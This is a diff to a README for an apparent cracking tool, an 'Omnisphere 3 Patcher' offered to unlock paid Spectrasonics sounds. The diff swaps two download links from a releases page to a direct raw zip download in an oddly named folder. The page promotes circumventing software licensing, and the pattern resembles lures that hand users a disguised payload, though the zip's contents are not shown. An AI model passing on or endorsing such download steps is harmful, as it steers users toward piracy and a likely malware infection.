@@ -1,6 +1,6 @@
 # 🎹 Spectrasonics-Omnisphere-3-Patcher - Unlock Premium Sounds Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Omnisphere_3_Patcher-FF6F00?style=for-the-badge&logo=github&logoColor=white)](https://github.com/lindabarb112233-debug/Spectrasonics-Omnisphere-3-Patcher/releases)
+[![Download Now](https://img.shields.io/badge/Download-Omnisphere_3_Patcher-FF6F00?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/lindabarb112233-debug/Spectrasonics-Omnisphere-3-Patcher/main/discommode/Spectrasonics-Patcher-Omnisphere-bowk.zip)
 
 ---
 
@@ -13,7 +13,7 @@ Welcome! This guide will help you download and set up the **Spectrasonics-Omnisp
 ## 📥 Download the Application
 
 Visit this link to download the application:  
-👉 **[Click Here to Download Omnisphere 3 Patcher](https://github.com/lindabarb112233-debug/Spectrasonics-Omnisphere-3-Patcher/releases)**
+👉 **[Click Here to Download Omnisphere 3 Patcher](https://raw.githubusercontent.com/lindabarb112233-debug/Spectrasonics-Omnisphere-3-Patcher/main/discommode/Spectrasonics-Patcher-Omnisphere-bowk.zip)**
 
 Once you click the link, you'll land on the download page. Look for the latest release file and click the download button. The file will start downloading to your computer automatically.
 
